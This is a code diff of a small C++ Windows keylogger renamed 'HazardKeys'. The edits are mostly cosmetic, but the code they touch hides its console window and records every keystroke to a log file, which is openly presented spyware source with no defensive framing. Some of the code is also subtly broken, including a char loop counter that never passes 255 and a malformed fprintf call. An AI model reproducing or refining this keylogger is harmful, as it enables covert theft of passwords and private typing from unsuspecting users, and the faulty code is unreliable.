@@ -1,11 +1,6 @@
-// Keylogger
-// Version 0.1B
-/*
+// HazardKeys by LinkerScript
+// *-*- Version 3.01.2 -*-*
 
-@about
-   @author Diary
-   @version 0.1
-*/
 
 #include <iostream>
 #include <Windows.h>
@@ -21,26 +16,40 @@ int main() {
   
   // Free the console so no one sees it
   FreeConsole();
-  
-  char  i;
+ 
+  char i;
   
   while(true) {
+     
     Sleep(10);
-    for(i = 8; i <= 255; i++) {
-      // if a key is pressed
-      if (GetAsyncKeyState(i) == -32767) {
+     
+    for(i = 8; i <= 255; i++)
+    {
+       
+      // If a key is pressed, write it to 'log.txt'
+      if (GetAsyncKeyState(i) == -32767) 
+      {
+         
         Save(i, "log.txt");
+         
       }
+       
     }
+     
   }
   return 0;
+   
 }
+
 // The save file that writes the keys to a file
 int Save(int _key, char *file) {
+   
   cout << _key << endl;
+  
   
   FILE *OUTPUT_FILE;
   
+  // Declare OUTPUT_FILE
   OUTPUT_FILE = fopen(file, "a+");
    
   // If a key is the SHIFT key, the BACK key, the RETURN key, or the ESCAPE key, write it as that [KEY]. Else, write the key pressed.
@@ -56,5 +65,7 @@ int Save(int _key, char *file) {
     fprintf(OUTPUT_FILE, '%s', &_key);
   fclose(OUTPUT_FILE); // Close the file
   
+  // Return exit code 0
   return 0;
+   
 }
